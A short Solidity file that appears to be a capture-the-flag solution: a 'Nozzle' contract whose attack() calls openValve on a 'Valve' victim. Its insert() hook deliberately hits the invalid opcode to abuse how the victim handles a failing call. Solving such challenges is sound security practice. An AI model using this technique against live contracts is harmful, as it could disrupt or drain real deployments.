// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../Valve.sol";

contract Nozzle is INozzle {
    function attack(Valve _victim) external {
        _victim.openValve(this);
    }

    function insert() external pure returns (bool) {
        assembly {
            invalid()
        }
    }
}
